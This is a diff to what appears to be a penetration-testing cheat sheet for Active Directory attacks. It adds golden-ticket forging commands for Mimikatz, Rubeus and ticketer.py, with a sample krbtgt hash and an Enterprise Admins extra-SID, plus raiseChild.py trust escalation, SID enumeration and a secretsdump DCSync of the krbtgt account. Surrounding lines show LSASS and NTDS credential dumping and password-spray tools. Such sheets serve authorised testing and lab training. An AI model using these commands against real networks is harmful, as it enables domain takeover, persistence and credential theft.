@@ -173,6 +173,7 @@ PS C:\> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,
 PS C:\> Get-DomainComputer
 PS C:\> Get-DomainGroup
 PS C:\> Get-DomainOU
+PS C:\> Get-DomainSID
 PS C:\> Find-InterestingDomainAcl
 PS C:\> Get-DomainGroupMember
 PS C:\> Get-DomainFileServer
@@ -207,6 +208,8 @@ PS C:\> Get-NetLocalGroupMember -ComputerName <computer> -GroupName "Remote Desk
 PS C:\> Get-DomainGPO | select displayname
 PS C:\> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid
 PS C:\> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+PS C:\> Get-DomainUser -Domain <domain> | select SamAccountName
+PS C:\> Get-DomainGroup -Domain <domain> -Identity "Enterprise Admins" | select distinguishedname,objectsid
 ```
 
 - Active Directory Module
@@ -1086,6 +1089,7 @@ C:\> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.1
 $ python psexec.py <username>:'<password>'@<IP address>
 $ python psexec.py <username>@<IP address>
 $ python psexec.py <domain>/<username>:'<password>'@<IP address>
+$ psexec.py <domain>/<username>@<hostname> -k -no-pass -target-ip <IP address>
 ```
 
 - Runas
@@ -1377,6 +1381,24 @@ PS C:\> $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force $
 PS C:\> $password = ConvertTo-SecureString '<password>' -AsPlainText -Force
 ```
 
+- Mimikatz Golden Ticket
+
+```
+mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<sid> /krbtgt:9d765b482771505cbe97411065964d5f /sids:<sid> /ptt
+```
+
+- Rubeus Golden Ticket
+
+```
+C:\> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:<domain> /sid:<sid> /sids:<sid> /user:<username> /ptt
+```
+
+- Ticketer Golden Ticket
+
+```
+$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain <domain> -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 <username>
+```
+
 #5. - Privilege Escalation
 -----------------------------------------
 
@@ -1526,6 +1548,12 @@ PS C:\> Get-SQLInstanceDomain
 PS C:\> Get-SQLQuery -Verbose -Instance "<IP address>,1433" -username "<domain>\<username>" -password "<password>" -query 'Select @@version'
 ```
 
+- RaiseChild
+
+```
+$ raiseChild.py -target-exec <IP address> <domain>/<username>
+```
+
 #6. - Brute Force
 -----------------------------------------
 
@@ -1546,6 +1574,14 @@ $ ./username-anarchy -i listoffirstandlastnames.txt
 
 ```
 $ ./kerbrute_linux_amd64 userenum --dc <DC IP address> --domain <Domain Name> names.txt
+```
+
+- LookupSID
+
+```
+$ lookupsid.py <domain>/<username>@<IP address>
+$ lookupsid.py <domain>/<username>@<IP address> | grep "Domain SID"
+$ lookupsid.py <domain>/<username>@<IP address> | grep -B12 "Enterprise Admins"
 ```
 
 - Office365 Password Spray
@@ -1949,7 +1985,8 @@ $ pypykatz lsa minidump lsass.dmp
 $ python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 $ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 $ impacket-secretsdump -k -no-pass -dc-ip <DC IP address> -just-dc-user <username> 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
-$ secretsdump.py -outputfile <filename> -just-dc INLANEFREIGHT/<username>@<IP address> -use-vss
+$ secretsdump.py -outputfile <filename> -just-dc <domain>/<username>@<IP address> -use-vss
+$ secretsdump.py <domain>/<username>@<IP address> -just-dc-user LOGISTICS/krbtgt
 ```
 
 - For Loops
